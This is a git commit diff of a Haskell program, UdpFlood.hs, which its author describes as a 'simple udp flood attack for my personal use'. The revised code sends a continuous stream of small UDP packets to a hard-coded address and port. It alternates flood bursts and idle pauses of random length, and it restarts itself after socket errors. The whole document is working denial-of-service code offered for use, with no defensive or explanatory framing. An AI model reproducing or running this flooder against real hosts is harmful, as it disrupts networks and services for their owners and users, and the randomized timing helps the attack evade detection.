11c55874fdf5ddf72eef46f741c3498c7d755bda
MgaMPKAy <mgampkay@163.com>
2012-06-18 22:39:07 +0800

    UdpFlood.hs  simple udp flood attack for my personal use

--- hasekll/socket/UdpFlood.hs
+++ hasekll/socket/UdpFlood.hs
@@ -1,26 +1,50 @@
 module Main where
 
+import Control.Concurrent
+import Control.Exception (catch)
+import Control.Monad (forever)
+import Data.ByteString.Char8 (pack)
 import Network.Socket hiding (sendTo)
 import Network.Socket.ByteString
-import Data.ByteString.Char8 (pack)
-import System.Environment
-import Control.Concurrent
-import Control.Monad
+import Prelude hiding (catch)
+import System.Environment (getArgs)
+import System.Random (randomRs, getStdGen)
+import System.Timeout (timeout)
 
 main :: IO ()
 main = do
-    (ip:port:size:time:_) <- getArgs
-    forkIO $ flood ip (read port) (read size) (read time)
-    threadDelay $ (read time) * 1000000
-    return ()
+    (mina:maxa:mini:maxi:_) <- fmap (fmap read) getArgs
+    sig <- newEmptyMVar
+    seed <- getStdGen
+    let attackTime = randomRs (mina, maxa) seed :: [Int]
+    let idleTime   = randomRs (mini, maxi) seed :: [Int]
+    catch (forkIO' $ flood' attackTime idleTime sig)
+          (\err -> do
+               print (err::IOError)
+               threadDelay (10 * 1000000) --sleep 10s
+               forkIO' $ flood' attackTime idleTime sig)
+    takeMVar sig -- wait for flood
+  where
+    forkIO' action = forkIO action >> return ()
 
-flood :: String -> Int -> Int -> Int -> IO ()
-flood ip port size time = withSocketsDo $ do
+    flood' attackTime idleTime sig =
+        flood "192.168.0.1" 7990 attackTime idleTime sig
+
+flood :: String -> Int -> [Int] -> [Int] -> MVar () -> IO ()
+flood ip port attackTime idleTime sig = do
     addrinfo <- getAddrInfo Nothing (Just ip) (Just $ show port)
     let target = addrAddress (head addrinfo)
-
     sock <- socket AF_INET Datagram defaultProtocol
-    forever $ loop sock target
-  where loop sock target = do
-            sendTo sock str target
-        str = pack $ replicate size 'A'
+    floodLoop sock target attackTime idleTime sig
+
+floodLoop:: Socket -> SockAddr -> [Int] -> [Int] -> MVar () -> IO ()
+floodLoop _ _ [] _ sig   = putMVar sig ()
+floodLoop _ _ _ [] sig = putMVar sig ()
+floodLoop sock target (a:as) (i:is) sig = do
+    print $ "flood " ++ show a
+    _ <- timeout (a * 1000000) $ forever $ sendTo sock attackString target
+    print $ "sleep " ++ show i
+    threadDelay (i * 1000000)
+    floodLoop sock target as is sig
+  where
+    attackString = pack $ replicate 10 'A'
